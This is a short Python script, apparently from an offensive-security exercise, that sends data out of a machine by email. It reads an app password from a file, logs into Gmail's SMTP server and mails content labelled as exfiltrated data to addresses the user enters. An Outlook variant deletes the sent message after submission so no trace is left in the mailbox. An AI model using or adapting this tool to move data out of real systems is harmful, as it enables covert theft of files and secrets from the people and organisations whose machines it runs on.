import smtplib
import time
# import win32com.client

smtp_server = 'smtp.gmail.com'
smtp_port = 587
smtp_acct = input("Enter the email address to use for exfiltration: ")
with open('apppass.txt', 'r') as f:
    smtp_pass = f.read().strip()
tgt_accts = list(input("Enter the email address(es) to send the exfiltrated data to (separate multiple addresses with commas): ").split(','))

def plain_email(subject, contents):
    message = f'Subject: {subject}\nFrom: {smtp_acct}\n'
    message += f'To: {", ".join(tgt_accts)}\n\n{contents.decode()}'
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_acct, smtp_pass)

    #server.set_debuglevel(1)
    server.sendmail(smtp_acct, tgt_accts, message)
    time.sleep(1)
    server.quit()

def outlook(subject, contents):
    outlook = win32com.client.Dispatch('Outlook.Application')
    message = outlook.CreateItem(0)
    message.DeleteAfterSubmit = True
    message.To = ';'.join(tgt_accts)
    message.Subject = subject
    message.Body = contents.decode()
    message.Send()

if __name__ == '__main__':
    plain_email('subject', b'contents')